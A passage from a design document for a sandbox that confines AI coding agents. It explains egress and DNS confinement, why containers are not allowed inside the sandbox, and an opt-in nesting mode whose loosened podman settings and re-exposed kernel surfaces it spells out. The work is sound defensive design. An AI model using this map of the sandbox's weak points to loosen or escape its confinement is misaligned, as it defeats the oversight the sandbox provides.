at once rather than travelling anywhere. The one name that must work needs no resolver at all,
because `--add-host` put it in `/etc/hosts`.

That is the same structure the proxy variables rest on — remove them and there is still no route —
and `SessionBoundaryTest` asserts both, along with the absent default route that is
their common cause.

## No containers inside the sandbox by default

Deliberate, both directions:

- **Nested** — a runtime inside the sandbox needs `/dev/net/tun`, `/dev/fuse` and, decisively,
  unmasking `/proc/kcore`, `/proc/keys` and friends, because a nested container cannot mount its own
  `/proc` while those locked overmounts are in place. The unmask would widen the host-kernel surface
  reachable from the same container that runs untrusted repository code, and same-uid nesting
  cannot run the stock `postgres` image anyway — its entrypoint chowns to a second uid.
- **Sibling** — a service container beside the sandbox would be a new host-level object with its own
  attack surface, reachable laterally from the sandbox and running outside its confinement.

What containers are usually wanted for here — a test database, an S3 endpoint — runs as ordinary
processes inside the sandbox instead, with the same uid, capabilities and egress confinement as
everything else: PostgreSQL rootless via `initdb`/`pg_ctl`, S3 via a JVM mock such as Adobe S3Mock.
`SANDBOX.md` points the agents the same way.

**The opt-in, and its price.** `KO_AGENT_SANDBOX_NESTING=same-uid` (exactly `none` or `same-uid`;
anything else refuses the launch, like the workspace guard) loosens exactly three things, and
loosens them for the whole session — the untrusted repository code included, which is the cost.
Why each one is unavoidable is measured at `NestingLoosenings`; what each one costs is:

- `--security-opt=unmask=ALL` re-exposes the informational surface — `/proc/keys`,
  `/proc/timer_list`, `/proc/sched_debug` — while `/proc/kcore` stays unreadable, owned by a real
  root this rootless container never maps. That class of leak matters in the kernel-exploit
  scenario this design already places out of scope ("Container, runtime and kernel escape", above).
- `--security-opt=label=disable` removes the machine's SELinux layer from around this one sandbox
  for the session; the boundary then rests on what the design counts on everywhere else —
  namespaces, dropped capabilities, seccomp, the read-only rootfs and the egress proxy.
- `--cap-add=SYS_CHROOT` reaches every process in the session, not just the nested runtime, because
  podman grants a capability to a non-root user ambiently. Acceptable because chroot is not a
  boundary this design relies on anywhere: nothing in the sandbox is chroot-confined, and under
  no-new-privileges there is no setuid binary for a hostile chroot to confuse.

`/dev/fuse` is not among them: nested storage runs on kernel-native overlay inside the user
namespace — measured, the container rootfs mounts as `overlay` and the test matrix passes with
the fuse-overlayfs binary removed — so the kernel's FUSE surface stays out.

Everything else holds, and the holds are what shape the feature. `no-new-privileges` stays, which
blocks the setuid `newuidmap`, which caps a nested namespace at a single mapped uid: an image that
switches `USER` or chowns to a second uid fails by design — this repository's own images among
them, so the sandbox still cannot build itself. The egress topology is inherited, not escaped:
inner containers share the sandbox's network namespace, their only route out is still the proxy,
and an image pull is an ordinary logged CONNECT to a registry on the allowlist — Docker Hub,
`gcr.io` and ECR Public are built in, any other registry is the project's `egress-hosts/read-only`
to add.
No runtime is preinstalled; podman arrives through the image's `sandbox-install-podman` — which
refuses outside this mode, and unpacks under `$HOME` as ordinary unprivileged code granted nothing
by the image. Its storage dies with the session (no cross-session executable cache), and the next
launch without the variable restores the masks.
